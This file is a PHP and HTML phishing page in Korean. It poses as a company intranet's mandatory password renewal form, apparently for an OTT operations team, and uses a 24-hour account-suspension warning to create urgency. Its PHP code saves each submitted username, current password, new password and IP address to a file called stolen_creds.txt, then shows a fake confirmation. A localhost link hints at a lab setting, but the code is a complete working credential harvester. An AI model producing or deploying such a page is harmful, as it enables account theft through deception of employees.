<?php
$done = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username   = trim($_POST['username'] ?? '');
    $current_pw = (string)($_POST['current_password'] ?? '');
    $new_pw     = (string)($_POST['new_password'] ?? '');
 
    if ($username !== '' && $current_pw !== '') {
        $log_data = sprintf(
            "[%s] IP: %s | Username: %s | CurrentPW: %s | NewPW: %s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $username,
            $current_pw,
            $new_pw
        );
        file_put_contents(__DIR__ . '/stolen_creds.txt', $log_data, FILE_APPEND | LOCK_EX);
    }
    $done = true;
}
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>보안 인증 갱신 - 사내 인트라넷</title>
    <style>
/* ===========================================================
   사내 인트라넷 공통 스타일
   =========================================================== */
:root {
    --bg:            #F5F6F8;
    --surface:       #FFFFFF;
    --border:        #E3E6EA;
    --text:          #1B1F23;
    --text-muted:    #6B7280;
    --sidebar-bg:    #1B2430;
    --sidebar-text:  #C7CDD6;
    --sidebar-active:#25313F;
    --accent:        #0F6B5C;
    --accent-hover:  #0C5548;
    --danger:        #C0392B;
    --warn:          #B8860B;
    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Pretendard", "Malgun Gothic", sans-serif;
}
* { box-sizing: border-box; }
html, body {
    margin: 0; padding: 0;
    background: var(--bg);
    color: var(--text);
    font-family: var(--font-sans);
    font-size: 14px;
    line-height: 1.6;
}
a { color: var(--accent); text-decoration: none; }
a:hover { color: var(--accent-hover); text-decoration: underline; }
 
.btn {
    display: inline-block;
    padding: 8px 16px;
    border-radius: 5px;
    font-size: 13px;
    font-weight: 600;
    border: 1px solid transparent;
    cursor: pointer;
}
.btn-primary { background: var(--accent); color: #fff; }
.btn-primary:hover { background: var(--accent-hover); color: #fff; text-decoration: none; }
 
.form-group { margin-bottom: 16px; }
.form-group label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 6px;
}
.form-group input[type=text],
.form-group input[type=password] {
    width: 100%;
    padding: 9px 12px;
    border: 1px solid var(--border);
    border-radius: 5px;
    font-size: 13px;
    font-family: inherit;
}
 
/* 로그인/보안인증 페이지 */
.login-page {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background: var(--sidebar-bg);
}
.login-box {
    width: 380px;
    background: var(--surface);
    border-radius: 8px;
    padding: 36px 32px;
}
.login-box h1 {
    font-size: 16px;
    font-weight: 700;
    text-align: center;
    margin: 0 0 6px;
}
.login-box .sub {
    text-align: center;
    color: var(--text-muted);
    font-size: 12px;
    margin-bottom: 24px;
}
.login-box .btn { width: 100%; text-align: center; }
 
/* 경고 배너 */
.alert-warn {
    background: #FFF8E1;
    border: 1px solid #F0C040;
    border-radius: 5px;
    padding: 10px 14px;
    font-size: 12px;
    color: var(--warn);
    margin-bottom: 20px;
    line-height: 1.5;
}
 
/* 완료 박스 */
.success-icon {
    text-align: center;
    font-size: 36px;
    margin-bottom: 12px;
}
.success-msg {
    text-align: center;
    font-size: 15px;
    font-weight: 700;
    color: var(--accent);
    margin-bottom: 8px;
}
.success-sub {
    text-align: center;
    font-size: 13px;
    color: var(--text-muted);
    line-height: 1.7;
    margin-bottom: 24px;
}
.divider {
    border: none;
    border-top: 1px solid var(--border);
    margin: 20px 0;
}
    </style>
</head>
<body class="login-page">
 
<?php if ($done): ?>
    <!-- 완료 화면 -->
    <div class="login-box">
        <div class="success-icon">✅</div>
        <p class="success-msg">보안 인증이 완료되었습니다.</p>
        <p class="success-sub">
            비밀번호가 정상적으로 갱신되었습니다.<br>
            변경된 비밀번호는 다음 로그인 시부터 적용됩니다.
        </p>
        <hr class="divider">
        <a href="http://localhost:8080/index.php" class="btn btn-primary"
           style="display:block; text-align:center;">
            ← 인트라넷 메인으로 돌아가기
        </a>
        <p style="text-align:center; font-size:11px; color:var(--text-muted); margin-top:14px;">
            OTT 통합 운영 관리팀
        </p>
    </div>
 
<?php else: ?>
    <!-- 비밀번호 변경 폼 -->
    <div class="login-box">
        <h1>🔐 사내 인트라넷</h1>
        <p class="sub">보안 정책 갱신 — 비밀번호 재설정</p>
 
        <div class="alert-warn">
            ⚠️ 사내 보안 정책 업데이트에 따라 기존 계정의 비밀번호 갱신이
            <strong>필수</strong>입니다. 24시간 이내 미완료 시 접근 권한이
            일시 중지될 수 있습니다.
        </div>
 
        <form method="post" action="change_pw.php">
            <div class="form-group">
                <label for="username">사내 계정 아이디</label>
                <input type="text" id="username" name="username"
                       placeholder="인트라넷 로그인 아이디"
                       autocomplete="username" required autofocus>
            </div>
            <div class="form-group">
                <label for="current_password">현재 비밀번호</label>
                <input type="password" id="current_password" name="current_password"
                       placeholder="현재 사용 중인 비밀번호"
                       autocomplete="current-password" required>
            </div>
            <div class="form-group">
                <label for="new_password">새 비밀번호</label>
                <input type="password" id="new_password" name="new_password"
                       placeholder="8자 이상, 영문+숫자+특수문자 포함"
                       autocomplete="new-password" required>
            </div>
            <div class="form-group">
                <label for="confirm_password">새 비밀번호 확인</label>
                <input type="password" id="confirm_password" name="confirm_password"
                       placeholder="새 비밀번호 재입력"
                       autocomplete="new-password" required>
            </div>
            <button type="submit" class="btn btn-primary">인증 완료</button>
        </form>
 
        <p style="text-align:center; font-size:11px; color:var(--text-muted); margin-top:16px;">
            문의: 운영팀 내부 메일 | OTT 통합 운영 관리팀
        </p>
    </div>
<?php endif; ?>
 
</body>
</html>
 
